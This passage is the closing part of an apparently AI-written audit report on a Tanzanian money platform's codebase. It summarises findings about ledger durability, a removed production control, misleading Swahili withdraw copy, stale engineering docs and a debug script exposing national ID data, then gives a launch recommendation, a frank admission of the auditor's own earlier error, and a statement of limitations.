2. **Evidence treated as secondary to money.** 21 fire-and-forget ledger writes, a reconciler that checks an invariant enforced at write time, a non-durable audit chain. For a licensed operator **the evidence is the product**. C2 is the proof: when evidence and money diverge, money loses.

3. **Controls relaxed for convenience.** C7 — a production hard-lock removed because it blocked an evaluation workflow, replaced by a comment saying "re-check before go-live." That is not a control. The answer was a staging environment.

4. **The UI says things the code doesn't do.** C8 — the withdraw screen promises tax on winnings, in Swahili, citing Cap 332, while the code takes 15% of principal. The design system is being used to communicate a behaviour the backend never implemented. **That's a seam problem, and seams are where trust dies.**

5. **The docs don't just describe a different product — they mandate it.** C9 — `CLAUDE.md:278` tells engineers to *"trust the kit, not the name"* for any colour change. That advice was **correct in June**. Today the kit is teal-215 with a light theme and the live build is royal-268 dark-only. **Following your documented process now produces the exact bug the warning was written to prevent.** It already claimed a victim: v2 of this audit. Your palette is matched to the brief within 0.3% — the threat to it is a text file.

6. **Debug scratch outlives the debugging.** C10 — `db-check.cjs` sits at repo root dumping raw NIDA numbers and legal names, bypassing every masking control you built, with no auth and no audit entry. Six versions of this report missed it because nothing imports it and it isn't in `src/`. **The most dangerous file in a repo is the one no tooling looks at.**

7. **The artifacts lag the code.** C11 — your logo moved to round 2 in `brand.tsx`; the exported SVGs and every PNG stayed at round 1. Your PWA icon and every transactional email ship a mark your own header calls superseded. **Verified visually, not inferred.** Same seam as C8 (copy vs code), C9 (docs vs code), C3 (ledger vs wallet): two definitions of one truth, nothing binding them.

8. **The docs describe a different product.** *(folded into C9)* — `CLAUDE.md` advertises light/dark theming that was deliberately killed, and French that never existed. `DESIGN_AUTHORITY`, cited three times as the authority for your single-theme invariant, **was never written**. This one misled *this audit*: v2 benchmarked your design system against a superseded snapshot because the doc said to. If a doc that visible is wrong, an inspector will ask which of your **compliance** docs are also wrong — and that question is much harder to answer than any bug in this report.

**None of this is unfixable.** No rewrite. The architecture is sound, the schema is right, the design system is genuinely good, and the hard parts — concurrency, idempotency, resumability, token governance, i18n — are already correct. The gaps are contained and roughly **five to six weeks** of focused work.

**Recommendation: complete the launch gate, then launch with confidence.**

The distance between this and a market leader is not architecture, and it is not design. Both are good. It is **making the product's promises and the product's behaviour the same thing** — in the ledger, in the audit chain, in the Swahili copy on the withdraw screen, and in the doc a new engineer reads on their first morning.

You told me design inconsistency drives Tanzanian users away faster than losing money. I pushed back on the ordering and I still would. But you were right about the mechanism, and I'd missed it: **the inconsistency doesn't arrive through bad design. It arrives through good engineers following stale instructions.** C9 is that, written down, waiting.

And you were right about the two verbs. A file that describes what *should* be true gets fixed — `CLAUDE.md` is wrong today, but it must exist and must become true. A file that describes what *was* true can only mislead, and no amount of fixing helps: the teal kit isn't out of date, it's **finished**. Keeping it is not caution. It's leaving a loaded instruction in the room.

And one thing I owe you plainly: **I was wrong about H3 in three consecutive versions.** Your security headers were there the whole time, written properly, in a file I never opened because I was checking for a convention Next.js had already renamed. That error is the same shape as the findings I'm reporting against you — C8 (copy asserting behaviour nobody verified), C3 (a reconciler asserting correctness it cannot check), H13 (docs asserting a product that isn't this one). **Asserting absence is a positive claim.** I asserted it from two greps. You caught it by asking a question about housekeeping.

Note what the single-theme decision demonstrates: you killed light mode, removed it cleanly from the code, forced `color-scheme: dark`, and left zero `dark:` variants across 548 files. **That is exactly the discipline this report is asking for everywhere else.** You already know how to do this. It just hasn't been applied to the ledger, the audit chain, or the docs.

Fix that, and this is a platform worth being proud of.

---

*Every finding was verified by executing proof-of-concept code or quoting source directly. WCAG ratios are computed from actual token values, not estimated. Where a defect is mitigated by another control, the mitigation is stated and severity adjusted.*

**Limitations.** Network access was disabled: `npm install` failed, so I could not execute the 57 suites, compile, run `a11y-audit.mjs`/axe-core, or test against live Postgres. C3, C4, C6 are reasoned from source + simulation — confirm against a real multi-instance deployment (the Week 2 CI deliverable). **No browser was used**, so visual polish, animation timing, actual responsive behaviour, and Swahili overflow at 360px remain **unverified** and are flagged as such throughout. This report is an input to a third-party penetration test and a live a11y audit, not a substitute for either.
